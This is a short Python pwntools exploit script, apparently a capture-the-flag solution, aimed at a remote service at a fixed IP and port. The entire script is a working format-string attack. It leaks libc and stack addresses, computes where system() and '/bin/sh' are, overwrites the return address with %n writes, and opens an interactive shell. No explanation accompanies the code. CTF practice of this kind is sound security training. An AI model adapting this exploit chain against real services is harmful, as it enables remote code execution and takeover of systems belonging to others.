from pwn import *


#p=process("./task")
p=remote("54.208.125.237",1302)

payload=""
payload+="%47$x-"
payload+="%7$x"

p.sendline(payload)
p.recvuntil("Welcome,")
leak=p.recvline()[:-1].split("-")
libc_start=int(leak[0],16)-0x018e81
eip=int(leak[1],16)-0x98
system=libc_start+0x03cd10
binsh=libc_start+0x17b8cf

print "eip:",hex(eip)
print "libc base: ",hex(libc_start)
print "system :",hex(system)
payload=""
payload+="BBB"
payload+=p32(eip)
payload+=p32(eip+2)


first_int_1=int("0x080490d0"[6:],16)
second_int_1=int("0x080490d0"[2:6],16)-first_int_1
if second_int_1 < 0:
	second_int_1+=0x10000


#	0xffffcf8c
payload+="%"+str(first_int_1-11)+"x"
payload+="%27$n"
payload+="%"+str(second_int_1)+"x"
payload+="%28$n"

p.sendline(payload)

print "#############"

p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
eip-=144



payload=""
payload+="AA"
payload+=p32(eip)
payload+=p32(eip+2)


first_int_1=int(str(hex(system))[6:],16)
second_int_1=int(str(hex(system))[2:6],16)-first_int_1
if second_int_1 < 0:
	second_int_1+=0x10000


payload+="%"+str(first_int_1-10)+"x"
payload+="%14$n"
payload+="%"+str(second_int_1)+"x"
payload+="%15$n"

p.sendline(payload)


payload=""
payload+="BBB"
payload+=p32(eip+8)
payload+=p32(eip+10)


first_int_1=int(str(hex(binsh))[6:],16)
second_int_1=int(str(hex(binsh))[2:6],16)-first_int_1
if second_int_1 < 0:
	second_int_1+=0x10000



payload+="%"+str(first_int_1-11)+"x"
payload+="%27$n"
payload+="%"+str(second_int_1)+"x"
payload+="%28$n"
print hex(eip)
p.sendline(payload)
p.interactive()

